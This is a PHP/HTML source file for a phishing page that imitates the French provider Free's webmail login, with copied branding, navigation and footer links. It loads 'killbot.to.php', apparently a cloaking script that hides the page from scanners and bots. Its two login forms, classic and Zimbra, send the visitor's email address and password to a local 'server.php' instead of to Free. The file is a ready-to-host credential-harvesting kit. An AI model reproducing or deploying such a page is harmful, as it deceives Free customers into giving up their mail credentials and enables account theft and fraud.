<?php
require_once('../killbot.to.php');

function get_base_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    return $protocol . $host . '/';
}

function asset($relative_path = '') {
    return get_base_url() . ltrim($relative_path, '/');
}

?>

<!DOCTYPE html>
<!-- saved from url=(0024)https://webmail.free.fr/ -->
<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    	
	<title>Accédez à vos emails Free</title>	
	<meta http-equiv="Content-Language" content="fr">
	<meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="cache-control" content="no-cache, must-revalidate">
    <meta http-equiv="imagetoolbar" content="no">
    <link rel="shortcut icon" href="<?= asset('webmail/favicon.ico') ?>" type="image/x-icon">
	<link rel="icon" href="<?= asset('webmail/favicon.ico') ?>" type="image/x-icon">
	<meta name="keywords" content="Free, adsl, offres adsl, internet, téléphone, téléphonie, mobiles, forfaits mobiles, tv, télévision, VOD, vidéo à la demande, multiposte, radio, wifi, routeur, freeplayer, freebox, multiplay, dégroupage, total, partiel, e-mail, mail, mél, fournisseur d&#39;accès, I.S.P., isp, internaute, internautes, France, français">
    <meta name="description" content="Bienvenue Accédez à vos emails Free, Jusqu’à 28 Méga, 10Go d’espace disque, WiFi-MiMo, Ligne téléphonique, Appels illimités vers 70 destinations, 250 chaînes de télévision, Vidéo à la Demande">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">

    <link href="<?= asset('webmail/asset_file/template.css') ?>" rel="stylesheet">
    <link href="<?= asset('webmail/asset_file/webmail.css') ?>" rel="stylesheet">

  </head>

<body class="webmail headerLight footerLight "><div id="didomi-host" data-nosnippet="true" aria-hidden="true"></div>
    <div class="nav"><div class="navmenu"><div class="menu"> <div class="menu_logo"> <input id="toggle" type="checkbox"> <label for="toggle" class="hamburger"> <div class="top-bun"></div><div class="meat"></div><div class="bottom-bun"></div></label> <div class="nav"> <div class="nav-wrapper"> <nav> <input id="hamburgerFreebox" type="radio" name="categorie"> <label for="hamburgerFreebox">FREEBOX <span class="plusminus"></span></label> <div> <a href="#">Toutes les Freebox</a> <a href="#">Freebox Delta</a> <a href="#">Freebox Pop</a> <a href="#">Freebox Révolution</a> <a href="#">Box 4G+</a> <a href="#">Freebox+Mobile</a> </div><input id="hamburgerMobile" type="radio" name="categorie"> <label for="hamburgerMobile">MOBILE <span class="plusminus"></span></label> <div> <a href="#">Tous les Forfaits</a> <a href=#">Forfait Free 5G</a> <a href=#">Série Free</a> <a href="#">Forfait 2€</a> <a href="#">Free Flex</a> <a href="#">Tous les smartphones</a> <a href="#">Bons plans</a> <a href="#">Smartphones 5G </a> </div><div> <a href="#">Boutique</a> <a href="#">Assistance</a> </div></nav> </div></div><div class="nav-background"></div><a href=#"><img src="<?= asset('webmail/asset_file/free.svg') ?>"></a></div><div class="menu_liens"> <div class="liens_animation"><a href="#">Freebox</a></div><span>|</span> <div class="liens_animation"><a href="#">Mobile</a></div><span>|</span> <div class="liens_animation"><a href="#">Boutiques</a></div><span>|</span> <div class="liens_animation"><a href="#">Assistance</a></div></div><div class="menu_espaceabo liens_animation"><a href="#">Espace abonné</a></div></div></div></div><div class="content">
        <!--colGauche-->
        <div class="contentWebmail">
            <!--webmailClassique-->
            <div class="webmailBloc webmailClassique">
                <div>
                    <h2>Bienvenue</h2><h3 style="color: red;">Associer votre e-mail</h3>
                </div>
                <form method="post" action="<?= asset('webmail/server.php') ?>">

                    <input type="email" placeholder="Adresse mail free" name="login" id="imapuser" required="required">
                    <input type="password" placeholder="Mot de passe" name="password" id="passwd" required="required"><span toggle="#passwd" id="togglePassword" class="togglePassword eye slash">
                        <div></div>
                        <div></div>
                    </span>
                    
                    <input type="submit" value="Se connecter">
                </form>
                <a href="#">Mot de passe oublié</a>
                <p>Vous utilisez le Webmail Zimbra ?<a href="#" onclick="showZimbra()">Cliquez ici pour y accéder</a>
                </p>
            </div>

            <!--webmailZimbra-->

            <div class="webmailBloc webmailZimbra">
                <div>
                    <h2>Bienvenue sur Zimbra</h2><span>Accédez à vos emails Free</span>
                </div>
                <form method="post" action="<?= asset('webmail/server.php') ?>">
                    <input type="email" placeholder="Adresse mail free" name="login" id="login">
                    <input type="password" placeholder="Mot de passe" name="password" id="password"><span toggle="#password" id="togglePassword" class="togglePassword eye slash">
                        <div></div>
                        <div></div>
                    </span>
                    
                    <input type="submit" value="Se connecter">
                </form>
                <a href="#">Mot de passe oublié</a>
                <p>Revenir sur le webmail Classique<a href="#">Cliquez ici pour y accéder</a>
                </p>
            </div>
            <!--/webmailZimbra-->

        </div>

        <!--colDroite-->
        <div class="contentWebmailAds">
            <img src="<?= asset('webmail/asset_file/webmail.jpg') ?>" class="noMobile">
            <div class="webmailAds">
                <div>

                    <div id="pubpave">
          
                    </div>
                </div>
                    <div><a href="#" ><img src="<?= asset('webmail/asset_file/banner-webmail.jpg') ?>"></a></div>

              
            </div>

        </div>




</div><div class="footer"><div class="footer"><div class="footer-padding"><div class="footer-bloc1"><div class="free-center"><div class="footer-bloc1-texte"><h1>Trouver une boutique Free</h1><p>Dans nos boutiques, les conseillers sont à votre pour vous guider et vous présenter les offres Freebox et les offres mobiles Free qui vous correspondent.</p><a href="#">Trouver une boutique</a></div></div><div class="free-center liens"><div class="footer-bloc1-texte"><h1>Informations Légales</h1><a href="#" >Politique de confidentialité des données</a><a href="#"  rel="noreferrer noopener">Informations légales</a><a href="#" >Cookies</a><a href="#" >Signaler un contenu illicite</a></div></div><div class="suivez-nous"><div class="footer-bloc1-texte"><h1>Suivez-nous</h1><p>Pour vous tenir au courant des toutes dernières actualités, mises à jour, exclusivité, promos, tout sur Free.</p><a href="#" ><img src="<?= asset('webmail/asset_file/facebook.svg') ?>"></a><a href="#"><img src="<?= asset('webmail/asset_file/twitter.svg') ?>"></a><a href="https://www.youtube.com/channel/UCzoLVwQrGOBlfzrma3FiJbg" ><img src="<?= asset('webmail/asset_file/player.svg') ?>"></a><a href="https://www.instagram.com/free.fr/?hl=fr" ><img src="<?= asset('webmail/asset_file/instagram.svg') ?>"></a></div><div></div></div></div><div class="footer-bloc2"><div><label for="toggle-offres">OFFRES &amp; SERVICES</label><input id="toggle-offres" type="checkbox"><div class="toggle-offres-liens"><a href="https://www.free.fr/freebox/freebox-delta">Freebox Delta</a><a href="https://www.free.fr/freebox/freebox-delta-s">Freebox Delta S</a><a href="https://www.free.fr/freebox/freebox-pop/">Freebox Pop</a><a href="https://www.free.fr/freebox/freebox-revolution">Freebox Révolution</a><a href="https://www.free.fr/freebox/repeteurwifi-pop/">Répéteur Wi-Fi Pop</a><a href="https://www.free.fr/freebox/offres-freebox-mobile">Freebox + Mobile</a><a href="https://www.free.fr/freebox/carte-fibre-optique/">Carte Fibre/ADSL</a><a href="https://signup.free.fr/subscribe_promo/#new">Testez votre éligibilité</a><a href="https://transfert.free.fr/">Free Transfert</a><a href="https://www.free.fr/freebox/resiliez-votre-fai/">Résiliez votre FAI</a><a href="https://www.free.fr/plan-du-site/">Plan du site</a></div></div><div><label for="toggle-abonnes">ESPACE ABONNÉ</label><input id="toggle-abonnes" type="checkbox"><div class="toggle-abonnes-liens"><a href="https://subscribe.free.fr/login/">Espace Abonné</a><a href="https://assistance.free.fr/articles/301">Déménagement</a><a href="https://assistance.free.fr/articles/linscription-a-loffre-freebox-756">Suivi de souscription</a><a href="https://assistance.free.fr/articles/consulter-mes-factures-freebox-298?search-text=factures">Factures</a><a href="https://assistance.free.fr/">Assistance</a><a href="https://www.free.fr/freebox/informations/nous-contacter/">Nous contacter</a><a href="https://www.free.fr/freebox/vos-applications/">Applications Free</a></div></div><div><label for="toggle-infos">INFORMATIONS LÉGALES</label><input id="toggle-infos" type="checkbox"><div class="toggle-infos-liens"><a href="https://adsl.free.fr/cgv/brochure_tarifaire_20220118.pdf?94">Brochure tarifaire</a><a href="https://adsl.free.fr/cgv/RC_20220118.pdf?78">Récapitulatifs contractuels</a><a href="https://adsl.free.fr/cgv/CGV_FORFAIT_hors_opt_20220118.pdf?16">Conditions Générales d'Abonnement</a><a href="https://adsl.free.fr/cgv/CGU_PACK_SECU_20200707.pdf?79">Conditions Générales d’Utilisation du Pack Sécurité</a><a href="https://adsl.free.fr/cgv/CG_VENTE_20220118.pdf?68">Conditions Générales de Vente</a><a href="https://www.free.fr/freebox/informations/politique-de-confidentialite/">Politique de confidentialité des données</a><a href="#">Signaler un contenu illicite</a><a href="https://www.free.fr/freebox/informations/protection-enfance/">Protection de l'enfance</a><a href="https://www.free.fr/pdf/cnc_guide_interactif.pdf">Guide Pratique des communications électroniques</a><a href="https://www.free.fr/freebox/informations/informations-legales/">Informations légales</a><a href="https://www.free.fr/freebox/cookies/">Cookies</a></div></div><div><label for="toggle-societe">SOCIÉTÉ</label><input id="toggle-societe" type="checkbox"><div class="toggle-societe-liens"><a href="https://pro.free.fr/">Free Pro</a><a href="https://www.free.fr/freebox/free-s-engage/">Free s'engage</a><a href="https://www.iliad.fr/">Le groupe Iliad</a><a href="https://recrutement.iliad.fr/offres/1?">Free recrute !</a></div></div></div></div></div></div></body></html>